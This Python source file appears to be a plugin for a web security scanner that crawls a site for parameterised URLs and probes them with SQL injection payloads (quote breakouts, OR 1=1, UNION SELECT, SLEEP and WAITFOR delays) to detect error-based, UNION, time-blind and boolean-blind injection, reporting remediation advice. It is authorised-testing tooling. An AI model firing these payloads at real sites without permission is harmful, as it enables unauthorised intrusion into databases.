"""SQL injection multi-method detector (critical findings).

Non-destructive, three detection methods:
1. Error-based: single quote probe, look for DB error strings
2. Time-based blind: SLEEP/pg_sleep payloads, measure delay
3. Boolean-based blind: compare AND 1=1 vs AND 1=2 responses
No data extraction, no stacked queries. Authorized testing only.
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from ..classifier import domain_from_target
from ..ratelimit import fetch
from .base import Cost, Ctx, Finding, Plugin, PluginResult, Target

SQL_ERRORS = [
    (r"SQL syntax.*?MySQL", "MySQL"),
    (r"Warning.*mysql_.*", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"MySqlClient\.", "MySQL"),
    (r"mysqli?::", "MySQL"),
    (r"PostgreSQL.*?ERROR|ERROR.*?PostgreSQL|pg_query\(\).*?ERROR", "PostgreSQL"),
    (r"Warning.*\Wpg_.*", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"Driver.*? SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.*? SQL Server", "MSSQL"),
    (r"SQLServer JDBC Driver", "MSSQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"ORA-[0-9]{5}", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"SQLite3::", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"Microsoft Access Driver", "MS Access"),
    (r"ODBC Driver", "ODBC"),
    (r"JDBC.*SQLException", "JDBC"),
    (r"supplied argument is not a valid", "PHP DB"),
]

REMEDIATION = ("Use parameterized queries / prepared statements everywhere. "
               "Never build SQL by string concatenation. Apply least-privilege "
               "DB accounts and hide error details in production.")

# Error-based payloads
SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1-- ",
    "' OR '1'='1' -- ",
    '" OR "1"="1',
    "') OR ('1'='1",
    "1' AND '1'='1",
    "%27",
    # stacked queries (detection only, no destructive statements)
    "'; SELECT 1-- ",
    "'; SELECT pg_sleep(0)-- ",
    # inline comments
    "'/**/OR/**/1=1-- ",
    "'/**/UNION/**/SELECT/**/1-- ",
    "1'/**/AND/**/'1'='1",
    # polyglot payloads (break out of multiple contexts)
    "'\"--",
    "')) OR (('1'='1",
    "')))) OR (((('1'='1",
    # comment-style terminators
    "'#",
    "'/*",
    "' OR '1'='1'/*",
]

# UNION-based detection payloads
SQLI_UNION_PAYLOADS = [
    "' UNION SELECT 1-- ",
    "' UNION SELECT 1,2-- ",
    "' UNION SELECT 1,2,3-- ",
    "' UNION ALL SELECT NULL-- ",
    # inline comment variants
    "'/**/UNION/**/SELECT/**/1,2-- ",
    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL-- ",
    # stacked query variants (detection only)
    "'; SELECT 1,2-- ",
    "'; SELECT NULL,NULL,NULL-- ",
]

# Time-based blind payloads: (payload, db_label)
SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(5)-- ", "MySQL"),
    ("'; WAITFOR DELAY '0:0:5'-- ", "MSSQL"),
    ("' AND pg_sleep(5)-- ", "PostgreSQL"),
    ("1' AND SLEEP(5)-- ", "MySQL"),
    # inline comment variants
    ("'/**/AND/**/SLEEP(5)-- ", "MySQL"),
    ("'/**/AND/**/pg_sleep(5)-- ", "PostgreSQL"),
    # Oracle (DBMS_LOCK / UTL_INADDR time delays)
    ("' AND 1=DBMS_LOCK.SLEEP(5)-- ", "Oracle"),
    ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS('1')-- ", "Oracle"),
    # stacked query variants
    ("'; SELECT SLEEP(5)-- ", "MySQL"),
    ("'; SELECT pg_sleep(5)-- ", "PostgreSQL"),
]


class SqliPlugin(Plugin):
    id = "sqli"
    aggressive = True  # suppressed on WAF-protected hosts
    label = "SQLi Probe"
    accepts = ["domain", "url"]
    passive = False
    cost = Cost.FREE
    group = "web"
    description = "SQLi check: error-based + time-blind + boolean-blind."

    async def run(self, target: Target, ctx: Ctx) -> PluginResult:
        t0 = time.monotonic()
        domain = domain_from_target(target.type, target.normalized)
        if not domain:
            return self._skipped("no domain for this target type")
        mode = self.module_mode(ctx)
        if mode == "passive":
            return self._skipped("needs active mode (sends probe requests)")
        base = f"https://{domain}" if target.type == "domain" else target.normalized
        findings: List[Finding] = []

        # discover URLs with query params from the homepage
        try:
            r = await fetch(ctx.http, ctx.limiter, "GET", base, rotate_ua=True, timeout=25,
                            follow_redirects=True)
            html = r.text[:300000]
            page_url = str(r.url)
        except Exception as e:
            res = self._degraded(f"fetch failed: {str(e)[:200]}")
            res.duration_ms = int((time.monotonic() - t0) * 1000)
            return res

        urls = set()
        for m in re.finditer(r'href=["\']([^"\']+\?[^"\']+)["\']', html, re.I):
            u = m.group(1)
            if u.startswith("/"):
                p = urlparse(page_url)
                u = f"{p.scheme}://{p.netloc}{u}"
            if domain in urlparse(u).netloc:
                urls.add(u)
        for m in re.finditer(r'<form[^>]+action=["\']([^"\']*)["\']', html, re.I):
            a = m.group(1) or page_url
            if a.startswith("/"):
                p = urlparse(page_url)
                a = f"{p.scheme}://{p.netloc}{a}"
            if "?" in a and domain in urlparse(a).netloc:
                urls.add(a)
        for eu in ctx.consume("endpoints"):
            if isinstance(eu, str) and "?" in eu and \
                    domain in urlparse(eu).netloc:
                urls.add(eu)

        # Test URLs concurrently (sem 4): on a WAF-blackholed target the
        # sequential version burns minutes; parallel keeps it to the
        # slowest URL's sequence. Early-exit per param is preserved.
        sem = asyncio.Semaphore(4)
        tested = [0]

        async def test_url(u: str):
            parts = urlparse(u)
            params = parse_qsl(parts.query)
            if not params:
                return
            for name, val in params[:3]:
                found = False

                # --- Method 1: Error-based ---
                for payload in SQLI_ERROR_PAYLOADS:
                    tested[0] += 1
                    probe = [(n, (v + payload) if n == name else v)
                             for n, v in params]
                    purl = urlunparse(parts._replace(query=urlencode(probe)))
                    try:
                        pr = await fetch(ctx.http, ctx.limiter, "GET", purl, rotate_ua=True,
                                         timeout=15, max_retries=1)
                        body = pr.text[:200000]
                    except Exception:
                        continue
                    for pat, db in SQL_ERRORS:
                        if re.search(pat, body, re.I | re.S):
                            findings.append(self._f(
                                "leak", "sqli_error_based",
                                f"CRITICAL: SQL injection in parameter "
                                f"'{name}' ({db} error leaked) at "
                                f"{parts.path or '/'}",
                                source="sqli probe", source_url=purl,
                                confidence=85, passive=False,
                                evidence={"severity": "critical",
                                          "method": "error-based",
                                          "parameter": name,
                                          "database": db,
                                          "payload": payload,
                                          "remediation": REMEDIATION,
                                          "scope_note": "Authorized testing only. "
                                                        "Do not exploit beyond detection."}))
                            found = True
                            break
                    if found:
                        break
                if found:
                    continue

                # --- Method 2: UNION-based ---
                for payload in SQLI_UNION_PAYLOADS:
                    tested[0] += 1
                    probe = [(n, (v + payload) if n == name else v)
                             for n, v in params]
                    purl = urlunparse(parts._replace(query=urlencode(probe)))
                    try:
                        pr = await fetch(ctx.http, ctx.limiter, "GET", purl, rotate_ua=True,
                                         timeout=15, max_retries=1)
                        body = pr.text[:200000]
                    except Exception:
                        continue
                    # UNION success: page renders differently without error
                    # Check for UNION-specific DB errors (column count mismatch)
                    if re.search(r"(column.*?mismatch|different number of columns|"
                                 r"UNION.*types? (are|do) not match|"
                                 r"SELECTs? to the left and right)",
                                 body, re.I):
                        findings.append(self._f(
                            "leak", "sqli_union_based",
                            f"CRITICAL: UNION-based SQL injection in parameter "
                            f"'{name}' at {parts.path or '/'} "
                            f"(column count error confirms injectability).",
                            source="sqli probe", source_url=purl,
                            confidence=80, passive=False,
                            evidence={"severity": "critical",
                                      "method": "union-based",
                                      "parameter": name,
                                      "payload": payload,
                                      "remediation": REMEDIATION,
                                      "scope_note": "Authorized testing only."}))
                        found = True
                        break
                if found:
                    continue

                # --- Method 3: Time-based blind ---
                for payload, db in SQLI_TIME_PAYLOADS:
                    tested[0] += 1
                    probe = [(n, (v + payload) if n == name else v)
                             for n, v in params]
                    purl = urlunparse(parts._replace(query=urlencode(probe)))
                    try:
                        p0 = time.monotonic()
                        await fetch(ctx.http, ctx.limiter, "GET", purl, rotate_ua=True,
                                    timeout=20, max_retries=1)
                        delta = time.monotonic() - p0
                    except Exception:
                        continue
                    if delta >= 4.0:
                        findings.append(self._f(
                            "leak", "sqli_time_blind",
                            f"CRITICAL: time-based blind SQL injection in "
                            f"parameter '{name}' ({db}, ~{delta:.1f}s delay) "
                            f"at {parts.path or '/'}",
                            source="sqli probe", source_url=purl,
                            confidence=75, passive=False,
                            evidence={"severity": "critical",
                                      "method": "time-based blind",
                                      "parameter": name,
                                      "database": db,
                                      "delay_s": round(delta, 1),
                                      "remediation": REMEDIATION,
                                      "scope_note": "Authorized testing only."}))
                        found = True
                        break
                if found:
                    continue

                # --- Method 4: Boolean-based blind ---
                # Compare AND 1=1 (true) vs AND 1=2 (false) response lengths
                tested[0] += 2
                try:
                    true_probe = [(n, (v + "' AND '1'='1") if n == name else v)
                                  for n, v in params]
                    false_probe = [(n, (v + "' AND '1'='2") if n == name else v)
                                   for n, v in params]
                    true_url = urlunparse(parts._replace(
                        query=urlencode(true_probe)))
                    false_url = urlunparse(parts._replace(
                        query=urlencode(false_probe)))
                    tr = await fetch(ctx.http, ctx.limiter, "GET", true_url, rotate_ua=True,
                                     timeout=15, max_retries=1)
                    fr = await fetch(ctx.http, ctx.limiter, "GET", false_url, rotate_ua=True,
                                     timeout=15, max_retries=1)
                    true_len = len(tr.text)
                    false_len = len(fr.text)
                    # Significant difference suggests boolean-based SQLi
                    if true_len > 0 and false_len > 0:
                        diff_ratio = abs(true_len - false_len) / max(true_len, false_len)
                        if diff_ratio > 0.3:
                            findings.append(self._f(
                                "leak", "sqli_boolean_blind",
                                f"HIGH: possible boolean-based blind SQL injection "
                                f"in parameter '{name}' at {parts.path or '/'} "
                                f"(response differs {diff_ratio:.0%} between "
                                f"true/false conditions).",
                                source="sqli probe", source_url=true_url,
                                confidence=60, passive=False,
                                evidence={"severity": "high",
                                          "method": "boolean-based blind",
                                          "parameter": name,
                                          "true_len": true_len,
                                          "false_len": false_len,
                                          "remediation": REMEDIATION,
                                          "scope_note": "Candidate: verify manually. "
                                                        "Authorized testing only."}))
                except Exception:
                    pass

        async def test_url_sem(u: str):
            async with sem:
                await test_url(u)

        await asyncio.gather(*[test_url_sem(u) for u in list(urls)[:8]])

        dur = int((time.monotonic() - t0) * 1000)
        res = self._ok(findings, f"probed {tested[0]} payloads across "
                                 f"{len(urls)} URLs, {len(findings)} SQLi signals")
        res.duration_ms = dur
        return res
